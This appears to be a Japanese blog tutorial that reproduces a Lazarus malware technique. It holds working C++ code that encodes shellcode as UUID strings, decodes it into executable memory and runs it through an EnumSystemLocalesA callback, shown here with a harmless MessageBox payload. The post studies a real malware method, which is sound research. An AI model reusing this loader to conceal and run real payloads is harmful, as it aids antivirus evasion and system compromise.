---
title: Let's try how to execute Lazarus shellcode
date: 2021-01-27 18:05:00 +09:00
categories: [Windows, Malware]
tags: [Malware, Lazarus]
---

twitterを漁っていたら、[RIFT: Analysing a Lazarus Shellcode Execution Method](https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/)の記事を見つけたので実際に試してみます。

この記事ではLazarusというマルウェアが難読化のためにShellcodeをUUIDの文字列として持っていて、[UuidFromStringA](https://docs.microsoft.com/ja-jp/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa)関数を使ってShellcodeに戻すという流れです。

今回使う元コードはダイナミックにPayloadを生成してくれるコードです。
```cpp
#include <Windows.h>

#include <iostream>
using namespace std;

unsigned char Payload[] = {
   0x48, 0x83, 0xec, 0x28,
   0x48, 0x83, 0xe4, 0xf0,
   0x48, 0xc7, 0xc1, 0x00, 0x00, 0x00,0x00,
   0x49, 0xb8, 0x12, 0x12, 0x12, 0x12, 0x12,
   0x12, 0x12, 0x12,
   0x48, 0xba, 0x23, 0x23, 0x23, 0x23, 0x23,
   0x23, 0x23, 0x23,
   0x45, 0x33, 0xc9,
   0x48, 0xb8, 0x34, 0x34, 0x34, 0x34, 0x34,
   0x34, 0x34, 0x34,
   0xff, 0xd0,
   0x48, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00,
   0x48, 0xb8, 0x45, 0x45, 0x45, 0x45, 0x45,
   0x45, 0x45, 0x45,
   0xff, 0xd0,
   'I', 'n', 'j', 'e', 'c', 't', 0x00,
};

int main() {
	LPVOID PayloadAddress{ nullptr };
	HANDLE hThread{ 0 };

	PayloadAddress = VirtualAlloc(nullptr, sizeof(Payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	*((ULONGLONG*)&Payload[0x11]) = (ULONGLONG)PayloadAddress + 0x45;
	*((ULONGLONG*)&Payload[0x1b]) = (ULONGLONG)PayloadAddress + 0x45;
	*((ULONGLONG*)&Payload[0x28]) = (ULONGLONG)GetProcAddress(LoadLibraryA("user32"), "MessageBoxA");
	*((ULONGLONG*)&Payload[0x3b]) = (ULONGLONG)GetProcAddress(GetModuleHandleA("ntdll"), "RtlExitUserThread");

	memcpy(PayloadAddress, Payload, sizeof(Payload));

	hThread = CreateRemoteThread(GetCurrentProcess(), nullptr, 0, (LPTHREAD_START_ROUTINE)PayloadAddress, nullptr, NULL, nullptr);

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
}
```

# UUID
まず、UUIDとはどんな感じなのかを[wiki](https://ja.wikipedia.org/wiki/UUID)で調べます。
すると、下記のようなことが書かれています。
```
UUID（Universally Unique Identifier）とは、ソフトウェア上でオブジェクトを一意に識別するための識別子である。UUIDは128ビットの数値だが、16進法による550e8400-e29b-41d4-a716-446655440000というような文字列による表現が使われることが多い。元来は分散システム上で統制なしに作成できる識別子として設計されており、したがって将来にわたって重複や偶然の一致が起こらないという前提で用いることができる[1]。マイクロソフトによるGUIDは、UUIDの実装の1つと見なせる。
```
この文章からわかることは、`11223344-5566-7788-99aa-bbccddeeff00` 的な感じだということです。
今回はそれだけで十分です。

# Make payload & Execution Method
## Simple code
[UuidFromStringA](https://docs.microsoft.com/ja-jp/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa)関数がどのように変換しているのかをもう少し理解するために、[UuidFromStringA](https://docs.microsoft.com/ja-jp/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa)関数とは逆の処理をする[UuidToString](https://docs.microsoft.com/ja-jp/windows/win32/api/rpcdce/nf-rpcdce-uuidtostring)関数も用いて見ていきます。

試しに下記のようなコードを作ってみました。
```cpp
#include <Windows.h>
#include <rpc.h>

#include <iostream>
using namespace std;

#pragma comment(lib, "Rpcrt4.lib")

int main() {
  BYTE Uuid[] = {
		0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
		0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00
	};
	RPC_CSTR StringUuid;

	UuidToStringA((const UUID*)Uuid, &StringUuid);
	cout << "[*] String: " << StringUuid << endl;

	DWORD_PTR hptr = (DWORD_PTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Uuid));

	UuidFromStringA(StringUuid, (UUID*)hptr);

	printf("[*] Hexdump: ");
	for (int i = 0; i < 16; i++) {
		printf("%02X ", ((unsigned char*)hptr)[i]);
	}
}
```
1. Uuidという配列に上記のような文字列で初期化します。
1. [UuidToString](https://docs.microsoft.com/ja-jp/windows/win32/api/rpcdce/nf-rpcdce-uuidtostring)関数でbinaryからUUIDの文字列へと変換します。
1. UUIDの文字列を出力します。
1. [UuidFromStringA](https://docs.microsoft.com/ja-jp/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa)でUUIDの文字列からbinaryに戻します。
1. それを出力します。

出力結果は下記のようになります。
```
[*] String: 44332211-6655-8877-99aa-bbccddeeff00
[*] Hexdump: 11 22 33 44 55 66 77 88 99 AA BB CC DD EE FF 00
```

この結果は地味に面白くて、始めの4bytesと2bytesと2bytesはリトルエンディアンされていて、残りはビッグエンディアンになっています。

## Obfuscated code
実際に難読化コードの作成します。
```cpp
#include <Windows.h>
#include <rpc.h>

#include <iostream>
using namespace std;

#pragma comment(lib, "Rpcrt4.lib")

unsigned char Payload[] = {
   0x48, 0x83, 0xec, 0x28,
   0x48, 0x83, 0xe4, 0xf0,
   0x48, 0xc7, 0xc1, 0x00, 0x00, 0x00,0x00,
   0x49, 0xb8, 0x12, 0x12, 0x12, 0x12, 0x12,
   0x12, 0x12, 0x12,
   0x48, 0xba, 0x23, 0x23, 0x23, 0x23, 0x23,
   0x23, 0x23, 0x23,
   0x45, 0x33, 0xc9,
   0x48, 0xb8, 0x34, 0x34, 0x34, 0x34, 0x34,
   0x34, 0x34, 0x34,
   0xff, 0xd0,
   0x48, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00,
   0x48, 0xb8, 0x45, 0x45, 0x45, 0x45, 0x45,
   0x45, 0x45, 0x45,
   0xff, 0xd0,
   'I', 'n', 'j', 'e', 'c', 't', 0x00,
};

int main() {
	RPC_CSTR StringUuid;
	RPC_STATUS err;

	for (int i = 0; i < sizeof(Payload); i += 16) {
		err = UuidToStringA((const UUID*)(Payload + i), &StringUuid);
		if (err == RPC_S_OUT_OF_MEMORY)
			break;

		cout << StringUuid << endl;
	}
}
```

これを実行すると下記のようになります。
```
28ec8348-8348-f0e4-48c7-c10000000049
121212b8-1212-1212-1248-ba2323232323
45232323-c933-b848-3434-343434343434
c748d0ff-00c1-0000-0048-b84545454545
ff454545-49d0-6a6e-6563-740000000000
```

## Decode & Execute
これでやっとPayloadのデコードと実行コードをができます。
```cpp
#include <Windows.h>
#include <rpc.h>

#include <iostream>
using namespace std;

#pragma comment(lib, "Rpcrt4.lib")

const char* uuids[] = {
	"28ec8348-8348-f0e4-48c7-c10000000049",
	"121212b8-1212-1212-1248-ba2323232323",
	"45232323-c933-b848-3434-343434343434",
	"c748d0ff-00c1-0000-0048-b84545454545",
	"ff454545-49d0-6a6e-6563-740000000000",
};

int main() {
    int elems = sizeof(uuids) / sizeof(uuids[0]);
    LPVOID va{ nullptr };
    va = VirtualAlloc(nullptr, ((sizeof(uuids[0]) / 2) * elems), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    DWORD_PTR hptr{ (DWORD_PTR)va };
    PBYTE bv{ (PBYTE)va };
    HANDLE hThread{ 0 };
    RPC_STATUS status{ RPC_S_OUT_OF_MEMORY };

    for (int i{ 0 }; i < elems; i++) {
        status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);
        if (status != RPC_S_OK) 
            return -1;

        hptr += 16;
    }

    *((ULONGLONG*)&bv[0x11]) = (ULONGLONG)va + 0x45;
    *((ULONGLONG*)&bv[0x1b]) = (ULONGLONG)va + 0x45;
    *((ULONGLONG*)&bv[0x28]) = (ULONGLONG)GetProcAddress(LoadLibraryA("user32"), "MessageBoxA");
    *((ULONGLONG*)&bv[0x3b]) = (ULONGLONG)GetProcAddress(GetModuleHandleA("ntdll"), "RtlExitUserThread");

    EnumSystemLocalesA((LOCALE_ENUMPROCA)va, 0);

    return 0;
}
```

これを実行するとMessageBoxがポップアップされます。


# Reference
[RIFT: Analysing a Lazarus Shellcode Execution Method](https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/)
[UUID - Wikipedia](https://ja.wikipedia.org/wiki/UUID)